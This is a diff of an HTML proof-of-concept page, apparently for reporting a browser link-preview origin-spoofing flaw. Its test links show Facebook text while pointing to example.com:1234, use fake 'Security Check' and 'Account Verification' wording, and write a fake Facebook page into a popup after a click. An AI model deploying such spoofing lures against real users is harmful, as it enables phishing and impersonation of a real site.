@@ -1,8 +1,40 @@
-  <!doctype html>
+<!doctype html>
   <meta charset="utf-8">
+  <title>Preview Origin Hidden PoC</title>
 
-  <a href="santa.html" target="ux" onclick="setTimeout(spoof, 200)">
-    <h1>click here</h1>
+  <h1>Preview Origin Hidden PoC</h1>
+
+  <p>1. Normal live URL control:</p>
+  <a href="https://www.facebook.com/" target="ux">
+    <h1>Facebook normal live URL</h1>
+  </a>
+
+  <hr>
+
+  <p>2. Hanging Facebook port. Check if preview hides domain:</p>
+  <a href="https://www.facebook.com:1234" target="ux">
+    <h1>hi from facebook</h1>
+  </a>
+
+  <hr>
+
+  <p>3. Mismatch test. Real href is example.com:1234, preview text says Facebook:</p>
+  <a href="https://example.com:1234" target="ux">
+    <h1>https://www.facebook.com</h1>
+  </a>
+
+  <hr>
+
+  <p>4. Stronger mismatch with fake login wording:</p>
+  <a href="https://example.com:1234" target="ux">
+    <h1>Facebook Security Check</h1>
+  </a>
+
+  <hr>
+
+  <p>5. Combine with popup write after click:</p>
+  <a href="https://www.facebook.com:1234" target="ux" onclick="setTimeout(spoof, 200)">
+    <h1>Facebook Account Verification</h1>
   </a>
 
   <script>
@@ -13,8 +45,7 @@
       t.document.write('<!doctype html><title>Facebook</title><h1>hi from facebook</h1>');
       t.document.close();
     } catch (e) {
-      console.log(e);
+      console.log('spoof blocked:', e);
     }
   }
   </script>
-
